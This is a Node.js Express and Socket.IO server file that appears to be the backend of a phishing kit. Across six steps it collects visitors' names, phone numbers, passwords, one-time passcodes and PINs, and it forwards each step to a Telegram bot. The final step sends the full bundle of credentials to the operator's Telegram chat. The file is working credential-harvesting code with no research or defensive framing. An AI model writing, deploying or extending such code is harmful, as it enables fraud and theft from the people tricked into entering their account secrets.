/**
 * server.js
 * Complete Express + Socket.IO server with WEBHOOK SUPPORT
 */

require('dotenv').config();

const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const cors = require('cors');
const { v4: uuidv4 } = require('uuid');

// Import Telegram bot manager
const botManager = require('./bot_manager');

// ============================================================================
// CONFIGURATION
// ============================================================================

const app = express();
const server = http.createServer(app);

const io = socketIo(server, {
    cors: {
        origin: '*',
        methods: ['GET', 'POST'],
        credentials: true
    }
});

// expose socket globally for bot callbacks in bot_manager.js
global.io = io;

const PORT = process.env.PORT || 3000;

// ============================================================================
// SESSION STORAGE
// ============================================================================
const sessions = new Map();

// ============================================================================
// MIDDLEWARE
// ============================================================================
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Logging Middleware
app.use((req, res, next) => {
    if (!req.path.startsWith('/bot')) { 
        console.log(`📝 ${req.method} ${req.path}`);
    }
    next();
});

// ============================================================================
// TELEGRAM WEBHOOK ROUTE
// ============================================================================
app.post(`/bot${process.env.BOT_TOKEN}`, (req, res) => {
    botManager.bot.processUpdate(req.body);
    res.sendStatus(200);
});

// ============================================================================
// SOCKET.IO CONNECTION HANDLING
// ============================================================================
io.use((socket, next) => {
    const sessionId = socket.handshake.auth.sessionId;
    socket.sessionId = sessionId || 'sess_' + uuidv4().substring(0, 8);
    // Fixed AppID generation to be more stable
    socket.appId = `ASA-${Math.random().toString(36).substring(2, 10).toUpperCase()}`;
    next();
});

io.on('connection', (socket) => {
    console.log(`🔌 SOCKET CONNECTED: ${socket.id} | AppID: ${socket.appId}`);

    let session = sessions.get(socket.sessionId);

    if (!session) {
        session = {
            appId: socket.appId,
            createdAt: Date.now(),
            lastActivity: Date.now(),
            step1: null, step2: null, step3: null,
            step4: null, step5: null, step6: null,
            completed: false
        };
        sessions.set(socket.sessionId, session);
    } else {
        session.lastActivity = Date.now();
        socket.appId = session.appId;
    }

    socket.join(socket.appId);
    socket.emit('session-ready', { appId: socket.appId });

    // --- STEP HANDLERS (FIXED CALLBACKS) ---
    
    socket.on('step1', (data, callback) => {
        session.step1 = data;
        botManager.sendStep1({ appId: session.appId, ...data });
        if (typeof callback === 'function') callback({ success: true, step: 1 });
    });

    socket.on('step2', (data, callback) => {
        session.step2 = data;
        botManager.sendStep2({ appId: session.appId, ...data });
        if (typeof callback === 'function') callback({ success: true, step: 2 });
    });

    socket.on('step3', (data, callback) => {
        session.step3 = data;
        botManager.sendStep3({ appId: session.appId, ...data });
        if (typeof callback === 'function') callback({ success: true, step: 3 });
    });

    socket.on('step4', (data, callback) => {
        session.step4 = data;
        botManager.sendStep4({
            appId: session.appId,
            firstName: session.step2?.firstName || 'Unknown',
            lastName: session.step2?.lastName || 'User',
            phone: data.phone,
            amount: session.step1?.amount || '0',
            password: data.password
        });
        if (typeof callback === 'function') callback({ success: true, step: 4 });
    });

    socket.on('step5', (data, callback) => {
        session.step5 = data;
        botManager.sendStep5({ appId: session.appId, ...data });
        if (typeof callback === 'function') callback({ success: true, step: 5 });
    });

    socket.on('step6', (data, callback) => {
        session.step6 = data;
        session.completed = true;
        botManager.sendStep6({
            appId: session.appId,
            firstName: session.step2?.firstName || 'Unknown',
            lastName: session.step2?.lastName || 'User',
            phone: session.step2?.phone || 'N/A',
            amount: session.step1?.amount || '0',
            password: session.step4?.password || 'N/A',
            otp: session.step5?.otp || 'N/A',
            pin: data.pin
        });
        if (typeof callback === 'function') callback({ success: true, step: 6, completed: true });
    });

    socket.on('request-otp', (data, callback) => {
        const otp = Math.floor(100000 + Math.random() * 900000).toString();
        socket.emit('otp-generated', { simulation: otp });
        botManager.sendTelegramMessage(`🔐 OTP REQUEST\nID: ${socket.appId}\nGenerated: ${otp}`);
        if (typeof callback === 'function') callback({ success: true, otp });
    });

    socket.on('disconnect', () => {
        console.log(`🔌 Socket disconnected: ${socket.id}`);
    });
});

// ============================================================================
// API ENDPOINTS
// ============================================================================
app.get('/api/health', (req, res) => {
    res.json({ status: 'ok', sessions: sessions.size });
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Error Handling
app.use((err, req, res, next) => {
    console.error('❌ Error:', err);
    res.status(500).json({ error: 'Internal server error' });
});

// START SERVER
server.listen(PORT, () => {
    console.log(`🚀 ASA SERVER RUNNING ON PORT ${PORT}`);
});